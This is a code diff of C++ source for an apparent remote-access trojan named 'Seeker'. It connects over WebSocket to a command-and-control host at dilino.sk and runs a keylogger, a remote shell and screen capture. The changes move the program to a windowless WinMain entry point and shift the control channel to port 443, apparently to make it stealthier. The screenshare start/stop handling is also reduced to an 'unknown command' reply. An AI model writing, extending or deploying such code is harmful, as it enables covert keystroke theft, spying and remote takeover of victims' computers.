@@ -27,8 +27,8 @@ struct Seeker {
     }
 };
 
-int main() {
-    WebSocketClient client("c2.dilino.sk", 8010, "/ws/seeker");
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    WebSocketClient client("dilino.sk", 443, "/ws/seeker");
     KeyLogger keylogger(client);
     Shell shell(client);
     ScreenShare screenshare(client);
@@ -60,18 +60,10 @@ int main() {
                 shell.writeShellInput(msg_data);
             }
             else if (msg_type == "screenshare_command") {
-                if (msg_data == "start") {
-                    screenshare.start_screenshare();
-                }
-                else if (msg_data == "stop") {
-                    screenshare.stop_screenshare();
-                }
-                else {
-                    nlohmann::json response;
-                    response["type"] = "screenshare_output";
-                    response["data"] = "[Info] Unknown screenshare_command: " + msg_data;
-                    client.sendMessage(response.dump());
-                }
+                nlohmann::json response;
+                response["type"] = "screenshare_output";
+                response["data"] = "[Info] Unknown screenshare_command: " + msg_data;
+                client.sendMessage(response.dump());
             }
             else if (msg_type == "keylogger_command") {
                 if (msg_data == "start") {
